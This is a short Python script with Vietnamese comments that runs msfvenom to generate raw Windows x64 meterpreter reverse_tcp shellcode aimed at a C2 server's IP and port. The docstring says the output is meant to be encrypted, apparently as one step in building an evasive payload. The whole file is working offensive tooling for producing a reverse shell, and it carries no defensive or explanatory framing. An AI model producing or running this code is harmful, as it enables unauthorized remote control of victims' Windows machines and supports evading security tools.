"""
Generate Shellcode using msfvenom or manual payload
Tạo reverse shell shellcode để encrypt
"""

import subprocess
import sys
import os

def generate_msfvenom_shellcode(lhost, lport, output_file="shellcode.bin"):
    """
    Args:
        lhost: IP của C2 server
        lport: Port của C2 server
        output_file: File output
    """
    
    print(f"[*] Generating shellcode with msfvenom...")
    print(f"[*] LHOST: {lhost}")
    print(f"[*] LPORT: {lport}")
    
    # Shellcode cho Windows x64 reverse shell
    cmd = [
        "msfvenom",
        "-p", "windows/x64/meterpreter/reverse_tcp",
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f", "raw",
        "-o", output_file,
        "--platform", "windows",
        "-a", "x64"
    ]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            file_size = os.path.getsize(output_file)
            print(f"[+] Shellcode generated: {output_file}")
            print(f"[+] Size: {file_size} bytes")
            return True
        else:
            print(f"[-] Error: {result.stderr}")
            return False
            
    except FileNotFoundError:
        print("[-] msfvenom not found!")
        print("[-] Install Metasploit Framework: https://www.metasploit.com/")
        return False

def main():
    if len(sys.argv) < 3:
        sys.exit(1)
    
    lhost = sys.argv[1]
    lport = sys.argv[2]
    generate_msfvenom_shellcode(lhost, lport)

if __name__ == "__main__":
    main()
